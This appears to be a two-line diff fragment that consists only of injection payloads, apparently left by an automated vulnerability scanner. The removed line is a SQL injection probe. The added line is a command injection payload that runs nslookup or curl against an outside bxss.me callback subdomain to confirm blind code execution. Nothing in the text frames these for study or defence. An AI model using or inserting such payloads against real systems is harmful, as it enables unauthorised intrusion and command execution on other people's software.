@@ -1,1 +1,1 @@
--1' OR 2+844-844-1=0+0+0+1 or 'hx6yvvZZ'='
+(nslookup -q=cname hitzzmztmfpsxcfec5.bxss.me||curl hitzzmztmfpsxcfec5.bxss.me))
